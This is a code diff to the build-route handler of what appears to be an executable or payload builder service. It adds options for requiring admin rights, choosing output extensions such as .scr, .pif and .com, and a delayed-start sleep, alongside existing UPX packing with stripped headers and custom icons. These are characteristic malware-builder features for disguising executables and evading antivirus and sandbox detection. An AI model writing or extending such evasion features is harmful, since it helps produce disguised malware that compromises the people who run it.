@@ -64,6 +64,9 @@ export async function handleBuildRoutes(
         iconBase64,
         enableUpx,
         upxStripHeaders,
+        requireAdmin,
+        outputExtension,
+        sleepSeconds,
       } = body;
 
       if (!platforms || !Array.isArray(platforms) || platforms.length === 0) {
@@ -145,6 +148,14 @@ export async function handleBuildRoutes(
       const safeIconBase64 = typeof iconBase64 === "string" && iconBase64.length > 0 && iconBase64.length <= 2 * 1024 * 1024
         ? iconBase64
         : undefined;
+      const safeRequireAdmin = !!requireAdmin;
+      const VALID_OUTPUT_EXTENSIONS = new Set([".exe", ".scr", ".bat", ".cmd", ".pif", ".com"]);
+      const safeOutputExtension =
+        typeof outputExtension === "string" && VALID_OUTPUT_EXTENSIONS.has(outputExtension.toLowerCase())
+          ? outputExtension.toLowerCase() : ".exe";
+      const safeSleepSeconds =
+        typeof sleepSeconds === "number" && Number.isInteger(sleepSeconds) && sleepSeconds >= 0 && sleepSeconds <= 3600
+          ? sleepSeconds : 0;
 
       deps.startBuildProcess(buildId, {
         platforms: allowedPlatforms,
@@ -172,6 +183,9 @@ export async function handleBuildRoutes(
         iconBase64: safeIconBase64,
         enableUpx: !!enableUpx,
         upxStripHeaders: !!upxStripHeaders,
+        requireAdmin: safeRequireAdmin,
+        outputExtension: safeOutputExtension,
+        sleepSeconds: safeSleepSeconds,
       });
 
       return Response.json({ buildId });
